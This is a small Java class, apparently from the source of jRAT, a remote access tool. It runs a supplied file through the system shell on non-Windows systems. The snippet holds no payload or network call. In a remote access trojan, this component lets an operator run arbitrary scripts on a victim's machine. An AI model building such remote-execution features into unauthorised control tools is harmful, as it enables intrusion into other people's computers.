package jrat.common.script;

import java.io.File;

import oslib.OperatingSystem;
import oslib.Shell;

public class ShellScript extends AbstractScript {
	
	@Override
	protected void perform(File file) throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec(new String[] { Shell.getShell().getPath(), file.getAbsolutePath() });
		}
	}

	@Override
	public String getExtension() {
		return "sh";
	}

}
